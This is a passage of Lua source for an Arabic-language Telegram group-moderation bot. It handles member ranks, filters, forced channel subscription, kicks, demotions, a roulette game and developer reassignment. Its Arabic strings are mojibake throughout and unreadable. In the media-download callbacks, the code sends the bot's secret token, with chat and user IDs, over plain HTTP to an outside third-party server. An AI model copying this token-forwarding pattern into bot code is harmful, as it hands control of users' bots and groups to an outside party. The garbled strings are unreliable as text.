DevRio:sismember(Rinda..'Rio:Cleaner:'..chat_id, user_id) then  RindaTeam = DevRio:get(Rinda.."Rio:Cleaner:Rd"..chat_id) or 'ุงูููุธู' else RindaTeam = DevRio:get(Rinda.."Rio:mem:Rd"..chat_id) or 'ุงูุนุถู' end return RindaTeam end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(Rinda) then  
var = true
elseif DevRio:sismember(Rinda..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(Rinda..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(Rinda..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(Rinda..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Rinda..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Rinda..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Rinda..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Rinda..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Rinda..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Rinda..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function RioDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevRio:sismember(Rinda..'Rio:RioSudo:', user_id) then
var = 'riosudo'
elseif DevRio:sismember(Rinda..'Rio:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevRio:sismember(Rinda..'Rio:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevRio:sismember(Rinda..'Rio:RioConstructor:'..chat_id, user_id) then
var = 'rioconstructor'
elseif DevRio:sismember(Rinda..'Rio:Owner:'..chat_id, user_id) then
var = 'owner'
elseif DevRio:sismember(Rinda..'Rio:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevRio:sismember(Rinda..'Rio:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevRio:sismember(Rinda..'Rio:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local function Filters(msg, value)
local rio = (Rinda..'Rio:Filters:'..msg.chat_id_)
if rio then
local names = DevRio:hkeys(rio)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "Source_Rinda")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฐุฑุง ุนุฒูุฒู โข ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุนุถู โข ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุถููุ โข ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุญุณุงุจ ูุญุฐูู ูู ุจุงูุชุงูุฏ ูุงุนุฏ ุงููุญุงููู", 1, 'md')
end
end,nil)   
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "ุงููุงูู"
elseif GetInfo.result.status == "administrator" then 
Status = "ูุดุฑู"
else
Status = false
end
if GetInfo.result.custom_title then 
Rio = GetInfo.result.custom_title
else 
Rio = Status
end
end
return Rio
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'โ๏ธฐูุงูู ุงููุฌููุนู')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'โ๏ธฐูุฌุฑุฏ ุนุถู ููุง')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'โ๏ธฐุงูุดุฎุต ุบูุฑ ููุฌูุฏ ููุง')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = 'โ๏ธ' else EDT = 'โ๏ธ' end
if GetInfo.result.can_delete_messages == true then DEL = 'โ๏ธ' else DEL = 'โ๏ธ' end
if GetInfo.result.can_invite_users == true then INV = 'โ๏ธ' else INV = 'โ๏ธ' end
if GetInfo.result.can_pin_messages == true then PIN = 'โ๏ธ' else PIN = 'โ๏ธ' end
if GetInfo.result.can_restrict_members == true then BAN = 'โ๏ธ' else BAN = 'โ๏ธ' end
if GetInfo.result.can_promote_members == true then VIP = 'โ๏ธ' else VIP = 'โ๏ธ' end 
send(msg.chat_id_,msg.id_,'โ๏ธฐุตูุงุญูุงุช '..GetCustomTitle(user_id,msg.chat_id_)..' ูู โข โค\n-----------------------------------------\nโ๏ธฐุญุฐู ุงูุฑุณุงุฆู โข '..DEL..'\nโ๏ธฐุฏุนูุฉ ุงููุณุชุฎุฏููู โข '..INV..'\nโ๏ธฐุญุธุฑ ุงููุณุชุฎุฏููู โข '..BAN..'\nโ๏ธฐุชุซุจูุช ุงูุฑุณุงุฆู โข '..PIN..'\nโ๏ธฐุชุบููุฑ ุงููุนูููุงุช โข '..EDT..'\nโ๏ธฐุงุถุงูุฉ ูุดุฑููู โข '..VIP..'\n-----------------------------------------')
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Rio = GetInfo.result.bio
else 
Rio = "ูุง ููุฌุฏ"
end
end
return Rio
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'ุฌุฏุง ุถุนูู' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ุถุนูู' 
elseif tonumber(msgs) < 500 then 
MsgText = 'ุบูุฑ ูุชูุงุนู' 
elseif tonumber(msgs) < 750 then 
MsgText = 'ูุชูุณุท' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'ูุชูุงุนู' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'ููุฉ ุงูุชูุงุนู' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ููู ุงูุชูุงุนู'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'ุงุณุทูุฑุฉ ุงูุชูุงุนู' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'ูุชูุงุนู ูุงุฑ' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'ูุฌุฏุญ ุฌุฏุญ' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'ุฎูุงูู' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'ุฑุจ ุงูุชูุงุนู' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'ูุงูุฑ ุจุงูุชูุงุนู' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "ูุนูู ูุฑุจู" 
end 
return MsgText
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(Rinda..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function ChCheck(msg)
local var = true 
if DevRio:get(Rinda.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(Rinda..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(Rinda..'Rio:ChText') then
local ChText = DevRio:get(Rinda..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Rinda.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*โ๏ธฐุจเขชู ูุชฺชุฏเขช ุชุณุชุฎุฏู ุงูุจูุช๐ !\nโ๏ธฐุงุดุชเขชู ุจููุงู ุงูุจูุช ุงูู ุดู๐ง  :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevRio:get(Rinda..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(Rinda..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Rinda..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐูุง ุงุณุชุทูุน ุทุฑุฏ โข "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุทุฑุฏู ูู ุงููุฌููุนู") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevRio:get(Rinda..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(Rinda..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Rinda..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงุทุฑุฏูู") 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText == '/yesdel' and DevRio:get(Rinda..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(Rinda..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Rinda..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(Rinda..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'ุงูููุดุฆูู โข ' else constructor = '' end 
if DevRio:sismember(Rinda..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'ุงููุฏุฑุงุก โข ' else Managers = '' end
if DevRio:sismember(Rinda..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'ุงูุงุฏูููู โข ' else admins = '' end
if DevRio:sismember(Rinda..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'ุงููููุฒูู โข ' else vipmem = '' end
if DevRio:sismember(Rinda..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'ุงูููุธููู โข ' else cleaner = '' end
if DevRio:sismember(Rinda..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'ุงููุทุงูู โข ' else donky = '' end
if DevRio:sismember(Rinda..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Rinda..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Rinda..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Rinda..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Rinda..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Rinda..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(Rinda..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Rinda..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Rinda..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุชูุฒููู ูู โข โค\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'ุงูุนุถู' then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐููุณ ูุฏูู ุฑุชุจู ูู ุงูุจูุช") 
else 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐูุง ุงุณุชุทูุน ุชูุฒูู โข "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู") 
DevRio:del(Rinda.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(Rinda.."Rio:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุงููุทูุฑ ุงูุฌุฏูุฏ โข ["..dp.first_name_.."](tg://user?id="..dp.id_..")\nโ๏ธฐุชู ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู ุถูุนู") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"โ๏ธฐุงูุถููุ โข ["..dp.first_name_.."](tg://user?id="..dp.id_..")\nโ๏ธฐููุฏ ุงุตุจุญุช ุงูุช ูุทูุฑ ูุฐุง ุงูุจูุช",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
Rinda = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevRio:del(Rinda.."Rio:NewDev"..data.sender_user_id_)
dofile('Rinda.lua') 
end
end
if DataText == '/nodel' and DevRio:get(Rinda..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(Rinda..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Rinda..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ูุฒููู") 
end
if DataText == '/YesRolet' and DevRio:get(Rinda.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(Rinda..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(Rinda..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(Rinda..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Rinda.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐ*ุตุงุญุจ ุงูุญุธ* โข ["..UserName.."]\nโ๏ธฐ*ูุจุฑูู ููุฏ ุฑุจุญุช ูุญุตูุช ุนูู 5 ููุงุท ููููู ุงุณุชุจุฏุงููุง ุจุงูุฑุณุงุฆู*")
end
if DataText == '/NoRolet' then
DevRio:del(Rinda..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Rinda.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(Rinda.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุงููุนุจู ูุงุนุงุฏุฉ ุงููุนุจ ุงุฑุณู ุงูุงูุนุงุจ") 
end
if DataText == '/ListRolet' then
local List = DevRio:smembers(Rinda..'Rio:ListRolet'..data.chat_id_) 
local Text = 'โ๏ธฐูุงุฆูุฉ ุงูุงุนุจูู โข โค\n-----------------------------------------\n' 
local Textt = '-----------------------------------------\nโ๏ธฐุชู ุงูุชูุงู ุงูุนุฏุฏ ุงูููู ูู ุงูุช ูุณุชุนุฏ ุ'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุนู โข",callback_data="/YesRolet"},{text="โข ูุง โข",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevRio:sismember(Rinda..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Rinda..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู ุถูุนู .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ูุฐุง ุงูุงูุฑ ููุดู ุงูุฑูุจูุช ูููุณ ูู .")..'&show_alert=true')
end 
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุฌุงุฑ ุชุญููู ุงููุชุงุฆุฌ ูุฑุฌู ุงูุงูุชุธุงุฑ .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('http://ccccxcc.ml/Rinda/YtRinda.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุฌุงุฑ ุชุญููู ุงููุชุงุฆุฌ ูุฑุฌู ุงูุงูุชุธุงุฑ .. .")..'&show_alert=true')
https.request('http://ccccxcc.ml/Rinda/YtRinda.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุฌุงุฑ ุชุญููู ุงููุชุงุฆุฌ ูุฑุฌู ุงูุงูุชุธุงุฑ .. .")..'&show_alert=true')
https.request('http://ccccxcc.ml/Rinda/YtRinda.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุฌุงุฑ ุชุญููู ุงููุชุงุฆุฌ ูุฑุฌู ุงูุงูุชุธุงุฑ .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('http://ccccxcc.ml/Rinda/YtRinda.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุงููููู โข "..Rio.." ุชู ุญุฐููุง") 
DevRio:del(Rinda..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Rinda..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(Rinda..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงููุงุก ูุญูุธ โข "..#List.." ูู ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู ููุงูุฑ โข "..Rio) 
DevRio:del(Rinda..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุนุฐุฑุง ุตูุงุญูุฉ ุงูุงูุฑ ููุชููู !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevRio:get(Rinda..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุนูููุฉ ุญูุธ ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู ููุงูุฑ โข "..Rio) 
DevRio:del(Rinda..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(Rinda..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(Rinda..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุนุฐุฑุง ุตูุงุญูุฉ ุงูุงูุฑ ููุชููู !") 
end
end
if DataText and DataText:match('/DelKt:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelKt:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุงูุณุคุงู โข "..Rio.." ุชู ุญุฐูู") 
DevRio:del(Rinda..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:srem(Rinda..'Rio:Sudo:Kt'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndKt:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndKt:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Rinda..'Rio:Text:KtTexts'..Rio..data.chat_id_)
if DevRio:get(Rinda..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงููุงุก ูุญูุธ โข "..#List.." ูู ุงูุงุณุฆูู ููุงูุฑ โข "..Rio) 
DevRio:del(Rinda..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุนุฐุฑุง ุตูุงุญูุฉ ุงูุงูุฑ ููุชููู !") 
end
end
if DataText and DataText:match('/DelAllKt:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelAllKt:'..tonumber(data.sender_user_id_)..'(.*)')
if DevRio:get(Rinda..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุนูููุฉ ุญูุธ ุงูุงุณุฆูู ููุงูุฑ โข "..Rio) 
DevRio:del(Rinda..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
